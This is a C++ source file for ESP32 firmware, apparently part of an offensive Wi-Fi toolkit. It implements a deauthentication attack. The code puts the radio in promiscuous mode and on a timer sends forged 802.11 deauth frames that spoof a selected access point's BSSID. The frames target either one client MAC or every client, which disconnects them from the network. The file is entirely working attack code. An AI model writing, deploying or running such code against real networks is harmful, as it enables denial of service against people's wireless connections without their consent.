#include "Deauth.h"
#include "esp_wifi.h"
#include "esp_timer.h"

#include "core/LedManager.h"
#include "core/Logger.h"
#include "utils/utils.h"
#include "models/wifi/select/WifiSelect.h"
#include "models/wifi/utils/utils.h"
#include "models/wifi/types/info.h"

static const char* TAG = "Wifi-Attack-Deauth";
static const volatile uint32_t send_interval_ms = 100;

esp_timer_handle_t WifiAttackDeauth::_timerHandle = nullptr;

void WifiAttackDeauth::start() {
    wifi::turnModeAPSTA();

    esp_wifi_set_promiscuous(true);
	wifi::wifiFilterFrameTypes(true, true, false);

    startTimer(1);

	LedManager::setStatus(LedStatus::Error);
	LOG_I(TAG, "WiFi attack deauth started");
}

void WifiAttackDeauth::stop() {
    stopTimer();

    esp_wifi_set_promiscuous(false);
	esp_wifi_set_promiscuous_rx_cb(nullptr);

    wifi::disableModeAPSTA();
    
	LedManager::setStatus(LedStatus::Successful);
	LOG_I(TAG, "WiFi attack deauth stopped");
}

void WifiAttackDeauth::startTimer(unsigned periodSec) {
    const esp_timer_create_args_t timerArgs = {
        .callback = &timerSendDeauthFrame,
        .arg =  nullptr,
    };

    esp_timer_create(&timerArgs, &_timerHandle);
    esp_timer_start_periodic(_timerHandle, periodSec * 100000);
}

void WifiAttackDeauth::stopTimer() {
    esp_timer_stop(_timerHandle);
    esp_timer_delete(_timerHandle);
}

void WifiAttackDeauth::timerSendDeauthFrame(void *arg) {
    if(!WifiSelect::hasNetwork()) return;

    const WifiNetworkInfo* selectNetwork = WifiSelect::getNetwork();
  
    if(WifiSelect::hasClient()){
        const WifiClientInfo* selectClient = WifiSelect::getClient();
        sendDeauthClientFrame(selectNetwork->bssid, selectClient->mac);
        LOG_I(TAG, "Bssid -> %s, Mac -> %s", utils::macToString(selectNetwork->bssid).c_str(), utils::macToString(selectClient->mac).c_str());
    } else {
        sendDeauthAllFrame(selectNetwork->bssid);
        LOG_I(TAG, "Bssid -> %s", utils::macToString(selectNetwork->bssid).c_str());
    }
}

esp_err_t WifiAttackDeauth::sendDeauthClientFrame(const uint8_t* bssid, const uint8_t* target) {
    DeauthFrame deauthFrame;

    memcpy(&deauthFrame.station, target, 6);
	memcpy(&deauthFrame.sender,  bssid, 6);
	memcpy(&deauthFrame.accessPoint, bssid, 6);

    return esp_wifi_80211_tx(WIFI_IF_STA, &deauthFrame, sizeof(deauthFrame), true);
}

esp_err_t WifiAttackDeauth::sendDeauthAllFrame(const uint8_t* bssid) {
    DeauthFrame deauthFrame;

    memcpy(&deauthFrame.sender, bssid, 6);
    memcpy(&deauthFrame.accessPoint, bssid, 6);
    return esp_wifi_80211_tx(WIFI_IF_STA, &deauthFrame, sizeof(deauthFrame), true);
}